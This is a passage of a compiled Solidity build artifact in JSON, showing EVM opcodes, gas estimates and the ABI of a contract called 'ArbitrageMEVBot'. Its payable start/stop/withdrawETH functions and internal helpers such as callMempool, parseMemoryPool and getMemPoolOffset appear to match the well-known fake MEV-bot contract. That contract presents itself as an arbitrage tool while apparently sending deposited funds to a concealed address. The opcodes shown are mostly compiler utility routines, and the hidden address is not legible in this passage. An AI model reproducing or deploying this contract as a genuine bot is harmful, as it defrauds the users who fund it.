JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1361 DUP2 PUSH2 0x1325 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x21 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x4 DUP2 LT PUSH2 0x13A8 JUMPI PUSH2 0x13A7 PUSH2 0x1368 JUMP JUMPDEST JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP PUSH2 0x13B9 DUP3 PUSH2 0x1397 JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x13C9 DUP3 PUSH2 0x13AB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x13D9 DUP2 PUSH2 0x13BE JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x13F4 PUSH1 0x0 DUP4 ADD DUP7 PUSH2 0x10A7 JUMP JUMPDEST PUSH2 0x1401 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x10A7 JUMP JUMPDEST PUSH2 0x140E PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x13D0 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x144A JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x142F JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1461 DUP3 PUSH2 0x1416 JUMP JUMPDEST PUSH2 0x146B DUP2 DUP6 PUSH2 0x1421 JUMP JUMPDEST SWAP4 POP PUSH2 0x147B DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x142C JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1493 DUP3 DUP5 PUSH2 0x1456 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x14D8 DUP3 PUSH2 0x1075 JUMP JUMPDEST SWAP2 POP PUSH2 0x14E3 DUP4 PUSH2 0x1075 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH2 0x14F1 DUP2 PUSH2 0x1075 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH2 0x1508 JUMPI PUSH2 0x1507 PUSH2 0x149E JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x1549 DUP3 PUSH2 0x1184 JUMP JUMPDEST SWAP2 POP PUSH2 0x1554 DUP4 PUSH2 0x1184 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x156C JUMPI PUSH2 0x156B PUSH2 0x149E JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x157D DUP3 PUSH2 0x1075 JUMP JUMPDEST SWAP2 POP PUSH2 0x1588 DUP4 PUSH2 0x1075 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x15B4 JUMPI PUSH2 0x15B3 PUSH2 0x149E JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x15C5 DUP3 PUSH2 0x1075 JUMP JUMPDEST SWAP2 POP PUSH2 0x15D0 DUP4 PUSH2 0x1075 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x15FC JUMPI PUSH2 0x15FB PUSH2 0x149E JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x160D DUP3 PUSH2 0x1184 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x163F JUMPI PUSH2 0x163E PUSH2 0x149E JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x1684 DUP3 PUSH2 0x1184 JUMP JUMPDEST SWAP2 POP PUSH2 0x168F DUP4 PUSH2 0x1184 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x169F JUMPI PUSH2 0x169E PUSH2 0x164A JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x16E4 DUP3 PUSH2 0x1184 JUMP JUMPDEST SWAP2 POP PUSH2 0x16EF DUP4 PUSH2 0x1184 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x16FF JUMPI PUSH2 0x16FE PUSH2 0x164A JUMP JUMPDEST JUMPDEST DUP3 DUP3 MOD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1715 DUP3 PUSH2 0x1184 JUMP JUMPDEST SWAP2 POP PUSH2 0x1720 DUP4 PUSH2 0x1184 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x1738 JUMPI PUSH2 0x1737 PUSH2 0x149E JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1756 DUP3 PUSH2 0x173E JUMP JUMPDEST SWAP2 POP PUSH2 0x1761 DUP4 PUSH2 0x173E JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0x177A JUMPI PUSH2 0x1779 PUSH2 0x149E JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x178B DUP3 PUSH2 0x173E JUMP JUMPDEST SWAP2 POP PUSH2 0x1796 DUP4 PUSH2 0x173E JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0x17AF JUMPI PUSH2 0x17AE PUSH2 0x149E JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 JUMPDEST 0xC9 MSTORE DUP7 DUP10 DELEGATECALL SWAP14 PUSH13 0xE06FA33ED05C756893DD4E114D 0x1F 0xCB PUSH10 0xD3639A21529AE4536473 PUSH16 0x6C634300081200330000000000000000 "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "1224600",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"baseToken()": "2533",
				"owner()": "2559",
				"quoteToken()": "2537",
				"running()": "2565",
				"start()": "infinite",
				"stop()": "infinite",
				"withdrawETH()": "infinite"
			},
			"internal": {
				"callMempool()": "infinite",
				"checkLiquidity(uint256)": "infinite",
				"getMemPoolDepth()": "23",
				"getMemPoolHeight()": "23",
				"getMemPoolLength()": "23",
				"getMemPoolOffset()": "23",
				"mempool(string memory,string memory)": "infinite",
				"mempoolCtrl(enum ArbitrageMEVBot.PoolAction)": "infinite",
				"mempoolLayer()": "29",
				"parseMemoryPool(string memory)": "infinite",
				"toHexDigit(uint8)": "infinite"
			}
		},
		"methodIdentifiers": {
			"baseToken()": "c55dae63",
			"owner()": "8da5cb5b",
			"quoteToken()": "217a4b70",
			"running()": "d85bd526",
			"start()": "be9a6555",
			"stop()": "07da68f5",
			"withdrawETH()": "e086e5ec"
		}
	},
	"abi": [
		{
			"inputs": [],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": false,
					"internalType": "string",
					"name": "_msg",
					"type": "string"
				}
			],
			"name": "Log",
			"type": "event"
		},
		{
			"inputs": [],
			"name": "baseToken",
			"outputs": [
				{
					"internalType": "address",
					"name": "",
					"type": "address"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "owner",
			"outputs": [
				{
					"internalType": "address",
					"name": "",
					"type": "address"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "quoteToken",
			"outputs": [
				{
					"internalType": "address",
					"name": "",
					"type": "address"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "running",
			"outputs": [
				{
					"internalType": "bool",
					"name": "",
					"type": "bool"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "start",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "stop",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "withdrawETH",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"stateMutability": "payable",
			"type": "receive"
		}
	]
}